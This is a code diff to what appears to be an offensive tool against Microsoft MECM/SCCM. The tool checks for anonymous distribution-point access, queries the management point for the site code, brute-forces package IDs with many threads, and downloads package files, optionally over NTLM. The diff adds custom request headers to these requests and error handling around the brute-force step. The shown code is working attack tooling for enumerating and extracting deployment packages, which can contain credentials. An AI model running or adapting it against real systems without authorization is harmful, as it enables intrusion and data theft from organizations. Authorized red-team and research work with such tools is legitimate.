@@ -13,7 +13,7 @@ from multiprocessing.pool       import ThreadPool
 from queue                      import Queue
 from bs4                        import BeautifulSoup
 
-from conf                       import bcolors, BRUTEFORCE_THREADS, DOWNLOAD_THREADS, ANONYMOUSDP
+from conf                       import bcolors, BRUTEFORCE_THREADS, DOWNLOAD_THREADS, ANONYMOUSDP, DP_DOWNLOAD_HEADERS, MP_INTERACTIONS_HEADERS
 
 logger = logging.getLogger(__name__)
 
@@ -22,7 +22,7 @@ def checkAnonymousDPConnectionEnabled(distribution_point):
     random_string = ''.join(random.choice(characters) for i in range(8))
 
     logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
-    r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}")
+    r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS)
     logger.info(f"[INFO] Request returned status code {r.status_code}")
     if r.status_code == 404:
         return ANONYMOUSDP.ENABLED.value
@@ -33,6 +33,7 @@ def checkAnonymousDPConnectionEnabled(distribution_point):
 
 def checkCredentialsBeforeDownload(distribution_point, username, password):
     sess = requests.Session()
+    sess.headers.update(DP_DOWNLOAD_HEADERS)
     sess.auth = HttpNtlmAuth(username, password)
     characters = string.ascii_letters
     random_string = ''.join(random.choice(characters) for i in range(8))
@@ -50,7 +51,7 @@ def retrieveSiteCode(management_point):
     logger.info(f"[INFO] Retrieving the MECM site code from management point")
     logger.info(f"[*] Querying MPKEYINFORMATION to extract site code from management point")
     logger.info(f"[INFO] Querying URL {management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION")
-    r = requests.get(f"{management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION")
+    r = requests.get(f"{management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION", headers=MP_INTERACTIONS_HEADERS)
     try:
         root = ET.fromstring(r.text)
     except:
@@ -102,7 +103,7 @@ def bruteforceThreadingWrapper(pool, to_bruteforce, sessions_pool, distribution_
 
 def recursivePackageDirectoryFetch(object, directory, authenticated_session=None):
     if authenticated_session is None:
-        r = requests.get(directory)
+        r = requests.get(directory, headers=DP_DOWNLOAD_HEADERS)
     else:
         r = authenticated_session.get(directory)
     soup = BeautifulSoup(r.content, 'html.parser')
@@ -162,6 +163,7 @@ def downloadFilesByExtension(directory_name, extensions, username, password):
         sessions_pool = Queue()
         for _ in range(min(BRUTEFORCE_THREADS, len(to_download))):
             sess = requests.Session()
+            sess.headers.update(DP_DOWNLOAD_HEADERS)
             if username is not None and password is not None:
                 sess.auth = HttpNtlmAuth(username, password)
             sessions_pool.put(sess)
@@ -198,6 +200,7 @@ def bruteforcePackageIDs(distribution_point, site_code, bruteforce_range, direct
     sessions_pool = Queue()
     for _ in range(min(BRUTEFORCE_THREADS, len(to_bruteforce))):
         sess = requests.Session()
+        sess.headers.update(DP_DOWNLOAD_HEADERS)
         if username is not None and password is not None:
             sess.auth = HttpNtlmAuth(username, password)
         sessions_pool.put(sess)
@@ -205,7 +208,11 @@ def bruteforcePackageIDs(distribution_point, site_code, bruteforce_range, direct
 
 
     pool = ThreadPool(min(BRUTEFORCE_THREADS, len(to_bruteforce)))
-    results = bruteforceThreadingWrapper(pool, to_bruteforce, sessions_pool, distribution_point)
+    try:
+        results = bruteforceThreadingWrapper(pool, to_bruteforce, sessions_pool, distribution_point)
+    except:
+        traceback.print_exc()
+        logger.warning(f"[-] Something went wrong while bruteforcing package IDs - the distribution point may have failed to respond in time ?")
 
     if username is not None and password is not None:
         directory_fetch_session = sessions_pool.get()
